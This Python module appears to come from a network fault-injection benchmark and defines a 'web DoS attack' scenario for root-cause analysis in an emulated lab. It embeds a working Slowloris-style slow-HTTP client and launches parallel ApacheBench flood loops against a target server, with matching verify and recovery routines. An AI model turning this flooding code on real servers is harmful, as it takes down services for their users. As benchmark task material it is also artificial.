from __future__ import annotations

import shlex
import time
from typing import Any
from urllib.parse import urlsplit

from pydantic import BaseModel, Field

from nika.net_env.verify import http_download_stats, median_float
from nika.problems.rca import node_resource
from nika.problems.base import (
    FailureDomain,
    build_verify_result,
    ProblemBase,
)
from nika.utils.logger import system_logger

# ==================================================================
# Problem: Web service under DoS attack
# ==================================================================

_SLOW_HTTP_CLIENT = "/tmp/nika_web_dos_slow.py"
_SLOW_HTTP_SOURCE = """#!/usr/bin/env python3
import socket
import sys
import time

target = sys.argv[1]
port = int(sys.argv[2])
wanted = int(sys.argv[3])
sockets = []
while True:
    while len(sockets) < wanted:
        sock = socket.socket()
        sock.settimeout(1.0)
        try:
            sock.connect((target, port))
            sock.sendall(b"GET / HTTP/1.1\\r\\nHost: target\\r\\nX-Nika: ")
            sockets.append(sock)
        except OSError:
            sock.close()
            time.sleep(0.01)
    time.sleep(2.0)
    alive = []
    for sock in sockets:
        try:
            sock.sendall(b"x")
            alive.append(sock)
        except OSError:
            sock.close()
    sockets = alive
"""


class WebDoSParams(BaseModel):
    """Parameters for injecting a web DoS attack fault."""

    host_name: str = Field(description="Target web server host name.")
    attacker_device: str = Field(description="Attacker host name.")
    observer_device: str | None = Field(
        default=None,
        description="Independent client used to observe HTTP degradation.",
    )
    probe_url: str | None = Field(
        default=None,
        description="URL on host_name used for healthy and degraded probes.",
    )
    attack_url: str | None = Field(
        default=None,
        description="Reachable service URL to flood when it differs from host_name's IP.",
    )
    workers: int = Field(default=12, ge=1, le=32)
    concurrency_per_worker: int = Field(default=128, ge=1, le=1024)
    slow_connections: int = Field(default=400, ge=0, le=900)
    probe_samples: int = Field(default=5, ge=3, le=15)
    probe_timeout_sec: int = Field(default=5, ge=1, le=30)
    attack_object_mb: int = Field(default=4, ge=1, le=64)


class WebDoS(ProblemBase):
    failure_domain = FailureDomain.SECURITY
    root_cause_name: str = "web_dos_attack"
    symptom_desc: str = "Users reports high latency when accessing some web services."
    TAGS: list[str] = ["http"]
    COMPATIBLE_COLUMNS = frozenset(
        {
            "campus_lan",
            "dc_clos",
            "enterprise_branch",
            "p4_dc_fabric",
            "p4_dc_gateway",
            "sdn_l3_clos",
        }
    )

    Params = WebDoSParams

    def __init__(self, scenario_name: str | None, **kwargs):
        super().__init__(scenario_name, **kwargs)
        self.logger = system_logger
        self._baseline: dict[str, Any] | None = None

    def root_cause_resources(self, params: WebDoSParams):
        return [node_resource(params.host_name)]

    def _probe_url(self, params: WebDoSParams, target_ip: str) -> str:
        return params.probe_url or f"http://{target_ip}/"

    def _http_samples(self, params: WebDoSParams, target_ip: str) -> dict[str, Any]:
        observer = params.observer_device or params.attacker_device
        url = self._probe_url(params, target_ip)
        times_ms: list[float] = []
        codes: list[str] = []
        for _ in range(params.probe_samples):
            sample = http_download_stats(
                self.runtime,
                observer,
                url,
                max_time_sec=params.probe_timeout_sec,
                connect_timeout_sec=min(3, params.probe_timeout_sec),
            )
            codes.append(sample.http_code)
            if sample.ok and sample.time_total_s is not None:
                times_ms.append(sample.time_total_s * 1000.0)
        ordered = sorted(times_ms)
        p95_ms = ordered[-1] if ordered else None
        return {
            "observer": observer,
            "url": url,
            "attempts": params.probe_samples,
            "successes": len(times_ms),
            "error_rate": 1.0 - (len(times_ms) / params.probe_samples),
            "median_ms": median_float(times_ms),
            "p95_ms": p95_ms,
            "samples_ms": times_ms,
            "http_codes": codes,
        }

    def _worker_state(self, params: WebDoSParams) -> tuple[int, int, str]:
        worker_output = self.runtime.exec(
            params.attacker_device,
            "ps -eo args 2>/dev/null | grep -c '[n]ika_web_dos_worker_' || true",
            timeout=10,
        ).strip()
        ab_output = self.runtime.exec(
            params.attacker_device,
            "ps -eo comm 2>/dev/null | grep -c '^ab$' || true",
            timeout=10,
        ).strip()
        try:
            workers = int(worker_output.splitlines()[-1])
        except (IndexError, ValueError):
            workers = 0
        try:
            ab_processes = int(ab_output.splitlines()[-1])
        except (IndexError, ValueError):
            ab_processes = 0
        return workers, ab_processes, f"workers={worker_output!r} ab={ab_output!r}"

    def _target_connections(self, host: str) -> int:
        output = self.runtime.exec(
            host,
            "ss -Htan '( sport = :80 )' 2>/dev/null | wc -l",
            timeout=10,
        ).strip()
        try:
            return int(output.splitlines()[-1])
        except (IndexError, ValueError):
            return 0

    def _slow_client_count(self, params: WebDoSParams) -> int:
        output = self.runtime.exec(
            params.attacker_device,
            "ps -eo args 2>/dev/null | grep -c '[n]ika_web_dos_slow.py' || true",
            timeout=10,
        ).strip()
        try:
            return int(output.splitlines()[-1])
        except (IndexError, ValueError):
            return 0

    def _slow_client_running(self, params: WebDoSParams) -> bool:
        return params.slow_connections == 0 or self._slow_client_count(params) >= 1

    def inject_fault(self, params: WebDoSParams):
        web_server = params.host_name
        attacker = params.attacker_device
        target_ip = self.runtime.get_host_ip(web_server, with_prefix=False)
        if not target_ip:
            raise RuntimeError(
                f"Cannot resolve IPv4 address for web server {web_server!r}"
            )
        if params.observer_device in {params.attacker_device, params.host_name}:
            raise ValueError(
                "observer_device must be independent of attacker and target"
            )

        self._baseline = self._http_samples(params, target_ip)
        if self._baseline["successes"] < params.probe_samples - 1:
            raise RuntimeError(
                f"web_dos_attack requires a healthy HTTP baseline: {self._baseline}"
            )

        self.runtime.exec(
            web_server,
            (
                "mkdir -p /var/www /var/www/html /var/www/nika-dos-dir; "
                f"dd if=/dev/zero of=/var/www/nika-dos.bin bs=1M "
                f"count={params.attack_object_mb} status=none 2>/dev/null; "
                "cp /var/www/nika-dos.bin /var/www/html/nika-dos.bin "
                "2>/dev/null || true; "
                "for i in $(seq 1 2000); do "
                ": > /var/www/nika-dos-dir/item-$i; done"
            ),
            timeout=30,
        )
        attack_url = params.attack_url or f"http://{target_ip}/nika-dos.bin"
        attack_endpoint = urlsplit(attack_url)
        attack_host = attack_endpoint.hostname or target_ip
        attack_port = attack_endpoint.port or 80
        quoted_url = shlex.quote(attack_url)
        self.runtime.exec(
            attacker,
            "pkill -f '[n]ika_web_dos_worker_' 2>/dev/null || true; "
            "pkill -x ab 2>/dev/null || true",
            timeout=10,
        )
        self.runtime.exec(
            attacker,
            "command -v ab >/dev/null 2>&1 || exit 127; "
            + " ".join(
                (
                    "nohup bash -c "
                    + shlex.quote(
                        "while true; do "
                        f"ab -n 200000000 -c {params.concurrency_per_worker} "
                        f"{quoted_url}; "
                        "sleep 0.05; done"
                    )
                    + f" nika_web_dos_worker_{worker} </dev/null "
                    + f">/tmp/nika_web_dos_{worker}.log 2>&1 &"
                )
                for worker in range(params.workers)
            ),
            timeout=15,
        )
        if params.slow_connections:
            self.runtime.write_file(attacker, _SLOW_HTTP_CLIENT, _SLOW_HTTP_SOURCE)
            self.runtime.exec(
                attacker,
                "pkill -f '[n]ika_web_dos_slow.py' 2>/dev/null || true",
                timeout=10,
            )
            self.runtime.exec(
                attacker,
                f"nohup python3 {_SLOW_HTTP_CLIENT} {attack_host} {attack_port} "
                f"{params.slow_connections} </dev/null "
                ">/tmp/nika_web_dos_slow.log 2>&1 &",
                timeout=10,
            )

        deadline = time.monotonic() + 12.0
        workers = ab_processes = connections = 0
        slow_client_running = False
        required_connections = max(2, min(20, params.slow_connections // 2))
        state = ""
        while time.monotonic() < deadline:
            time.sleep(0.5)
            workers, ab_processes, state = self._worker_state(params)
            connections = self._target_connections(web_server)
            slow_client_running = self._slow_client_running(params)
            if (
                workers >= params.workers
                and ab_processes >= 1
                and slow_client_running
                and connections >= required_connections
            ):
                break
        if (
            workers < params.workers
            or ab_processes < 1
            or not slow_client_running
            or connections < required_connections
        ):
            logs = self.runtime.exec(
                attacker,
                "tail -n 20 /tmp/nika_web_dos_0.log 2>/dev/null || true",
                timeout=10,
            )
            raise RuntimeError(
                "web_dos_attack traffic did not become ready: "
                f"{state}, slow_client={slow_client_running}, "
                f"target_connections={connections}, log={logs!r}"
            )
        self.logger.info(
            "Started web DoS: attacker=%s target=%s workers=%d concurrency=%d connections=%d",
            attacker,
            web_server,
            workers,
            params.concurrency_per_worker,
            connections,
        )

    def verify_fault(self, params: WebDoSParams) -> dict:
        """Verify the attack processes are injected (artifact gate for inject)."""
        web_server = params.host_name
        attacker = params.attacker_device
        target_ip = self.runtime.get_host_ip(web_server, with_prefix=False)
        workers, ab_processes, process_state = self._worker_state(params)
        target_connections = self._target_connections(web_server)
        slow_client_running = self._slow_client_running(params)
        required_connections = max(2, min(20, params.slow_connections // 2))
        attack_ready = bool(
            workers >= params.workers
            and ab_processes >= 1
            and slow_client_running
            and target_connections >= required_connections
        )
        return build_verify_result(
            fault_type=self.root_cause_name,
            verified=attack_ready,
            details={
                "attacker": attacker,
                "target_ip": target_ip,
                "workers": workers,
                "ab_processes": ab_processes,
                "target_connections": target_connections,
                "slow_client_running": slow_client_running,
                "process_state": process_state,
                "attack_ready": attack_ready,
            },
        )

    def recover_fault(self, params: WebDoSParams) -> dict:
        self.runtime.exec(
            params.attacker_device,
            "pkill -f '[n]ika_web_dos_worker_' 2>/dev/null || true; "
            "pkill -x ab 2>/dev/null || true; "
            "pkill -f '[n]ika_web_dos_slow.py' 2>/dev/null || true",
            timeout=10,
        )
        time.sleep(0.3)
        workers, ab_processes, _ = self._worker_state(params)
        slow_clients = self._slow_client_count(params)
        return {
            "verified": workers == 0 and ab_processes == 0 and slow_clients == 0,
            "details": {
                "workers": workers,
                "ab_processes": ab_processes,
                "slow_clients": slow_clients,
            },
        }
